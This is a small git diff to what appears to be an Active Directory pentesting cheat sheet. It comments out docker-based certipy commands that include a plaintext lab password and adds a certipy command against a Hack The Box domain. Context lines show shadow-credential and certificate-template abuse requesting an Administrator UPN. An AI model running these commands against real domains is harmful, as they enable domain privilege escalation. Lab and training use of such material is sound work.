@@ -1394,7 +1394,7 @@ python3 examples/dacledit.py -principal own_user -target target_user -dc-ip 10.1
 #### Shadow Credential
 GenericAll, GenericWrite WriteProperty 
 
-https://github.com/ShutdownRepo/pywhisker
+https://github.com/ShutdownRepo/pywhisker <br/>
 https://github.com/dirkjanm/PKINITtools
 ```bash
 # Get pfx
@@ -1765,8 +1765,9 @@ openssl pkcs12 -in cert.pem -inkey priv.key -keyex -CSP "Microsoft Enhanced
 Cryptographic Provider v1.0" -export -out admin.pfx
 
 ##certipy
-docker build -t certipy:latest .
-docker run -it -v $(pwd):/tmp certipy:latest certipy find -dc-ip 192.168.210.30 -u 'jodie.summers@nara-security.com' -p hHO_S9gff7ehXw -vulnerable -debug -stdout
+### docker build -t certipy:latest .
+### docker run -it -v $(pwd):/tmp certipy:latest certipy find -dc-ip 192.168.210.30 -u 'jodie.summers@nara-security.com' -p hHO_S9gff7ehXw -vulnerable -debug -stdout
+certipy find -dc-ip 10.10.11.69 -u 'ca_svc@fluffy.htb' -hashes aaaaaaaaa -vulnerable -stdout
 # ntpdate dc-ip
 certipy req -username 'user@example.com' -password Password -ca CA_Name -dc-ip DCIP -template TempName -upn
 'Administrator@example.com' -debug
